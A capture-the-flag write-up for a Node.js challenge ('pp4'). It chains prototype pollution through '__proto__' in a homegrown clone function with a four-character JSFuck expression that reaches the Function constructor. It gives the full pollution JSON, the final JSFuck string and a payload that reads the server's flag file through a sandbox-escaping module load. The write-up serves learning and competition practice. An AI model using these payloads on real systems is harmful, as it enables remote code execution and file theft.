# pp4

## Challenge Overview

The challenge involved a Node.js script running on the organizer's infra in a container which also housed a file containing the flag.

The script did the following things:

1. Accepted a JSON string, which it parsed with JSON.parse and then it deep-cloned it using a homegrown clone function
2. Accepted JavaScript code which then it executed in the same script using `eval`. The code could only use 4 distinct characters.

## Our solution

After viewing the source code of the script we quickly noticed that the flaw lies in the `clone` function.

```js
const clone = (target, result = {}) => {
  for (const [key, value] of Object.entries(target)) {
    if (value && typeof value == "object") {
      if (!(key in result)) result[key] = {};
      clone(value, result[key]);
    } else {
      result[key] = value;
    }
  }
  return result;
};
```

It does not check the `key` for `"prototype"` or `"__proto__"`. This means it is vulnerable to [prototype pollution](https://learn.snyk.io/lesson/prototype-pollution/).

And the other part of the script reminded us of [JSFuck](https://jsfuck.com/). The only problem is that JSFuck uses 6 characters (two more than were allowed in the task). That being said the JSFuck homepage includes a handy cheatsheet of strings it uses to encode different things:

- `false`       =>  `![]`
- `true`        =>  `!![]`
- `undefined`   =>  `[][[]]`
- `NaN`         =>  `+[![]]`
- `0`           =>  `+[]`
- `1`           =>  `+!+[]`
- `2`           =>  `!+[]+!+[]`
- `10`          =>  `[+!+[]]+[+[]]`
- `Array`       =>  `[]`
- `Number`      =>  `+[]`
- `String`      =>  `[]+[]`
- `Boolean`     =>  `![]`
- `Function`    =>  `[]["filter"]`
- `eval`        =>  `[]["filter"]["constructor"]( CODE )()`
- `window`      =>  `[]["filter"]["constructor"]("return this")()`

As we can see not all of them use the full 6 characters - some of them only two or four. This means we should somehow combine this subset of a subset to execute something useful.

We knew that we would somehow need to execute normal JS code in there, so we needed the `eval` primitive. It uses exactly 4 different characters (`[`, `]`, `(`, `)`), and from that we can eliminate all the primitives that use `!` or `+`. This leaves us with:

- `undefined`   =>  `[][[]]`
- `Array`       =>  `[]`
- `Function`    =>  `[]["filter"]`
- `eval`        =>  `[]["filter"]["constructor"]( CODE )()`
- `window`      =>  `[]["filter"]["constructor"]("return this")()`

That means we need to somehow represent three strings: `"filter"`, `"constructor"` and the code that dumps the flag. We will provide those using the prototype pollution.


We modified the script a little bit to serve as a playground to test our solution. This is how we got our first required string.

```js
(async () => {
// Step 1: Prototype Pollution

    const json = `{
        "__proto__": {
            "undefined": "filter"
        }
    }`
  console.log(clone(JSON.parse(json)));

  // Step 2: JSF**k with 4 characters

   const undef = `[][[]]`;
   const filterStr = `[][${undef}]`;
   const code = `${filterStr}`;
  if (new Set(code).size > 4) {
    console.log("Too many :(");
    return;
  }
  console.log("result", eval(code));
})().finally(() => rl.close());
```

To achieve that we polluted the `Object` prototype at with the key of `"undefined"` and indexed an array with `undefined`. `Array` extends `Object` and `undefined` got converted to a string, so the `filter` string was retrieved.

 We used javascript's template literal to "compose" the final code not to get lost in the mess of multiple characters `[`, `]` right next to each other.


We then proceeded to obtaining the `"constructor"` string. 

```js
(async () => {
// Step 1: Prototype Pollution

    const json = `{
        "__proto__": {
            "undefined": "filter",
            "filter": "constructor"
        }
    }`
  console.log(clone(JSON.parse(json)));

  // Step 2: JSF**k with 4 characters

   const undef = `[][[]]`;
   const filterStr = `[][${undef}]`;
   const constructorStr = `[][${filterStr}]`;
   const code = `${constructorStr}`;
  if (new Set(code).size > 4) {
    console.log("Too many :(");
    return;
  }
  console.log("result", eval(code));
})().finally(() => rl.close());
```

We decided to add another key - `"filter"` to the prototype and then index the array with it (since we have it from the previous step).

This program yielded an unexpected result:

```
> node pp4.js
{}
result [Function: filter]
```

After some experimentation we noticed that this does not happen for other strings than `"filter"`. Turns out this is due to the fact that [`Array.prototype.filter()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter) exists and it overrides the field we polluted. 

Fortunately we had another string - our code that could serve as a key. Then in the key indexed by the code we added another object with the same indexes - but the values were `"filter"` and `"constructor"`.  We added a placeholder for the code we were going to execute:


```js
(async () => {
// Step 1: Prototype Pollution

    const payload = `console.log("hello")`;
    const json = `{
        "__proto__": {
            "undefined": ${JSON.stringify(payload)},
            ${JSON.stringify(payload)}: {
                ${JSON.stringify(payload)}: "constructor",
                "undefined": "filter"
            }
            
        }
    }`
  console.log(clone(JSON.parse(json)));

  // Step 2: JSF**k with 4 characters

   const undef = `[][[]]`;
   const codeStr = `[][${undef}]`;
   const filterStr = `[][${codeStr}][${undef}]`
   const constructorStr  = `[][${codeStr}][${codeStr}]`
   const code = `[][${filterStr}][${constructorStr}](${codeStr})()`;
  if (new Set(code).size > 4) {
    console.log("Too many :(");
    return;
  }
  console.log("result", eval(code));
})().finally(() => rl.close());
```

This is the JSFuck part of the challenge done. The final resulting JSFuck was:

```js
[][[][[][[][[]]]][[][[]]]][[][[][[][[]]]][[][[][[]]]]]([][[][[]]])()
```

Now came the part of writing the payload. Initially we started with this code:

```js
const fs = require('fs');
console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))
```

Unfortunately it broke with:

```
    const fs = require('fs');
               ^

ReferenceError: require is not defined
```

Apparently this happens in nodejs when writing code as a string and passing it to the `Function` prototype. Fortunately we found [this stackoverflow post](https://stackoverflow.com/a/43492031) which remediated the problem.

Final payload:

```js
const fs = global.process.mainModule.constructor._load('fs');
    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))
```

The only thing left was to take the final JSON and JSFuck and send it to the server over `nc`. This is roughly what we sent:

JSON:

```json
{"__proto__":{"undefined":"\n    const fs = global.process.mainModule.constructor._load('fs');\n    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))\n    ","\n    const fs = global.process.mainModule.constructor._load('fs');\n    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))\n    ":{"\n    const fs = global.process.mainModule.constructor._load('fs');\n    console.log(fs.readFileSync('/' + fs.readdirSync('/').find(file => file.startsWith('flag')), 'utf8'))\n    ":"constructor","undefined":"filter"}}}
```

JSFuck:

```js
[][[][[][[][[]]]][[][[]]]][[][[][[][[]]]][[][[][[]]]]]([][[][[]]])()
```
